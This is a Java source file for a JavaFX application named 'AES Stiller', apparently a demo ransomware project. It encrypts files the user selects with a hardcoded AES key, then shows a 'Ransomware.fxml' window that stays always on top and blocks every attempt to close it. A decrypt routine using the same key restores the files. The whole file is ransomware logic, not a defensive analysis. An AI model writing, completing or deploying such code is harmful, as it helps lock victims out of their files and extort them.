package org.example.aesstiller;

import javafx.application.Application;
import javafx.application.Platform;
import javafx.event.Event;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.stage.FileChooser;
import javafx.stage.Stage;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class Main extends Application {
    public static List<File> selectedFiles = new ArrayList<>();
    public static List<File> encryptedFiles = new ArrayList<>();
    public static List<File> decryptFiles = new ArrayList<>();

    @Override
    public void start(Stage primaryStage) throws Exception {
        FileChooser fileChooser = new FileChooser();
        fileChooser.setTitle("Select Files or Directories");

        fileChooser.getExtensionFilters().addAll(new FileChooser.ExtensionFilter("All Files", "*.*"));
        selectedFiles = fileChooser.showOpenMultipleDialog(primaryStage);

        List<File> files = new ArrayList<>();
        if (selectedFiles != null) {
            for (File file : selectedFiles) {
                files.add(FolderEncryptor.encryptFile(file, "!the-best_#projec%t_for_Alex@"));
            }
        } else {
            System.out.println("No files selected.");
            start(primaryStage);
        }
        encryptedFiles.addAll(files);

        if (!encryptedFiles.isEmpty()) {
            FXMLLoader loader = new FXMLLoader(Main.class.getResource("Ransomware.fxml"));
            Parent root = loader.load();
            primaryStage.setTitle("AES Stiller");
            primaryStage.setAlwaysOnTop(true);
            primaryStage.setScene(new Scene(root));
            primaryStage.setOnCloseRequest(Event::consume);
            primaryStage.setResizable(false);
            primaryStage.setFullScreen(false);
            primaryStage.show();
        }
    }

    public static void main(String[] ignoredArgs) {
        launch();
    }

    public static void decrypt() {
        List<File> files = new ArrayList<>();
        for (File file : encryptedFiles) {
            files.add(FolderEncryptor.decryptFile(file, "!the-best_#projec%t_for_Alex@"));
        }
        decryptFiles.addAll(files);
    }
}
